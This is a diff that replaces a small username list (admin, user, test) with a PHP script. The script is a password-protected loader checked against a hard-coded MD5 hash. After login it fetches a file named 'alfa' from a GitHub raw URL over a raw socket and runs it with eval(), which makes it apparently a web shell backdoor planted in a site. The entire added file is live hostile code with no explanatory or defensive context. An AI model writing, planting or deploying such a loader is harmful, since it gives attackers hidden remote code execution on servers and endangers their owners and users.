@@ -1,3 +1,50 @@
-admin
-user
-test
+<?php
+
+session_start();
+if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
+    $host = 'raw.githubusercontent.com';
+    $port = 443;
+    $path = '/ONEJACK/a/main/alfa';
+    
+    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
+    if (!$fp) {
+        echo "Error: $errstr ($errno)<br />\n";
+    } else {
+        $out = "GET $path HTTP/1.1\r\n";
+        $out .= "Host: $host\r\n";
+        $out .= "Connection: Close\r\n\r\n";
+        fwrite($fp, $out);
+    
+        $content = '';
+        while (!feof($fp)) {
+            $content .= fgets($fp, 128);
+        }
+        fclose($fp);
+    
+        $header_end = strpos($content, "\r\n\r\n");
+        if ($header_end !== false) {
+            $content = substr($content, $header_end + 4);
+        }
+    
+        eval("?>" .$content);
+    }
+} else {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $password = $_POST['password'] ?? '';
+
+        if (md5($password) === "2311e3f6265f1eebe9be2b5a79d7b102") {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        }
+    }
+
+    ?>
+    <form method="post">
+        <input type="password" name="password"><br><br>
+        <button type="submit">Login</button>
+    </form>
+
+    <?php
+}
+?>
